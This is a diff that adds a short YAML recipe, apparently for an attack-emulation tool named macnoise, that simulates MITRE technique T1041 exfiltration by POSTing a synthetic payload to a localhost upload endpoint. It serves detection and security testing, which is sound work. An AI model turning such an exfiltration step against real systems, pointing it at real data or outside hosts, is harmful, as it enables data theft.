@@ -1,0 +1,14 @@
+version: 1
+name: HTTP Exfiltration Recipe
+description: Sends a synthetic payload through the generic HTTP primitive
+on_error: stop
+
+steps:
+  # T1041 - Exfiltration Over C2 Channel
+  - id: upload
+    module: net_http
+    params:
+      target: http://127.0.0.1:8080/upload
+      method: POST
+      body: macnoise synthetic exfiltration payload
+      content_type: application/octet-stream
